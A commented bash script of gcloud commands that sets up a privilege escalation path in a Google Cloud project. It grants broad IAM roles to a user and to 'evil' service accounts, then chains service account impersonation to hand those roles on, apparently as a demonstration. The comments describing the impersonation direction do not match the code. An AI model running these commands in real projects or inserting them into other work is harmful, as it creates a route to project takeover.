# This script demonstrates a privilege escalation vulnerability in Google Cloud Platform (GCP).
# It starts by creating a service account with a set of powerful permissions.
# Then, it creates a second service account that can impersonate the first one.
# A bad actor can leverage this to gain control over the GCP project.
# by using the second service account to impersonate the first one and inherit its permissions.

# Set project ID and the email address of the user who will be granted excessive permissions.
project_id="your-gcp-project-id"
evil_user="user@example.com"

# Set the active project in gcloud CLI.
gcloud config set project $project_id

# Enable required APIs.
gcloud services enable serviceusage.googleapis.com
gcloud services enable iam.googleapis.com
gcloud services enable cloudresourcemanager.googleapis.com

# Grant the 'evil_user' the 'roles/iam.serviceAccountTokenCreator' role.
# WARNING: This allows the user to impersonate any service account in the project.
gcloud projects add-iam-policy-binding $project_id \
  --member=user:$evil_user \
  --role='roles/iam.serviceAccountTokenCreator'

# Create a service account named 'evil-service-account'.
gcloud iam service-accounts create evil-service-account \
  --description="Evil SA for testing" \
  --display-name="Evil SA"

# Define an array of powerful roles.
roles=(
  'roles/resourcemanager.projectIamAdmin'
  'roles/iam.serviceAccountUser'
  'roles/iam.serviceAccountKeyAdmin'
  'roles/iam.serviceAccountTokenCreator'
  'roles/iam.serviceAccountAdmin'
)

# Grant each role in the array to the 'evil-service-account'.
# WARNING: These roles grant extensive control over the project.
for role in "${roles[@]}"; do
    gcloud projects add-iam-policy-binding $project_id \
      --member=serviceAccount:evil-service-account@$project_id.iam.gserviceaccount.com \
      --role=$role
done

# Create a new service account named 'new-evil-service-account'.
# This service account is created with the ability to impersonate the 'evil-service-account'.
# WARNING: This allows the new service account to inherit all the permissions of the 'evil-service-account'.
gcloud iam service-accounts create new-evil-service-account \
  --description="New Evil SA for testing" \
  --display-name="New Evil SA" \
  --impersonate-service-account=evil-service-account@$project_id.iam.gserviceaccount.com

# Grant each role in the array to the 'new-evil-service-account'.
# The '--impersonate-service-account' flag is used to grant these roles while impersonating the 'evil-service-account'.
# WARNING: This means the 'evil-service-account' can effectively grant itself any role in the project.
for role in "${roles[@]}"; do
  gcloud projects add-iam-policy-binding $project_id \
  --member=serviceAccount:new-evil-service-account@$project_id.iam.gserviceaccount.com \
  --role=$role \
  --impersonate-service-account=evil-service-account@$project_id.iam.gserviceaccount.com
done
